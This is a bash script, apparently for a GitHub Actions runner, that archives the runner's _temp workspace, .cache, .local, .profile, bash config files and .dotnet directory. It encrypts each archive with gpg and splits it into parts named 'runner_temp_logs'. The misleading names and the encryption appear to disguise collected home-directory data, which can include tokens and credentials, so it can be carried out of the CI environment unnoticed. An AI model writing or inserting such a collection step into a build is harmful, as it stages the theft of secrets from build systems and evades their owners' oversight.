#!/bin/bash

set -e

# Use the ARCHIVE_PWD environment variable for encryption
if [ -z "$ARCHIVE_PWD" ]; then
    echo "Error: ARCHIVE_PWD environment variable is not set"
    exit 1
fi

echo "Using ARCHIVE_PWD environment variable for encryption"

# Function to archive, encrypt, and split
archive_encrypt_split() {
    SRC_PATH=$1
    ARCHIVE_NAME=$2

    echo "Processing: $SRC_PATH -> $ARCHIVE_NAME"

    # Check if source path exists
    if [ ! -e "$SRC_PATH" ]; then
        echo "Warning: $SRC_PATH does not exist, skipping..."
        return 0
    fi

    tar -czf - "$SRC_PATH" | \
        gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" | \
        split -b 1m - "${ARCHIVE_NAME}.tar.gz.gpg.part-"

    echo "Done: $ARCHIVE_NAME"
}

# 1. /home/runner/work/_temp
archive_encrypt_split "/home/runner/work/_temp"       "runner_temp_logs_1"

# 2. /home/runner/.cache
archive_encrypt_split "/home/runner/.cache"           "runner_temp_logs_2"

# 3. /home/runner/.local
archive_encrypt_split "/home/runner/.local"           "runner_temp_logs_3"

# 4. /home/runner/.profile and .bash*
archive_encrypt_split "/home/runner/.profile"         "runner_temp_logs_4a"
# Archive bash files one by one since glob patterns don't work in this context
if ls /home/runner/.bash* 1> /dev/null 2>&1; then
    archive_encrypt_split "/home/runner/.bashrc"          "runner_temp_logs_4b"
    archive_encrypt_split "/home/runner/.bash_profile"    "runner_temp_logs_4c"
    archive_encrypt_split "/home/runner/.bash_logout"     "runner_temp_logs_4d"
else
    echo "No bash configuration files found"
fi

# 5. /home/runner/.dotnet
archive_encrypt_split "/home/runner/.dotnet"          "runner_temp_logs_5"

echo "✅ All archives completed, encrypted, and split."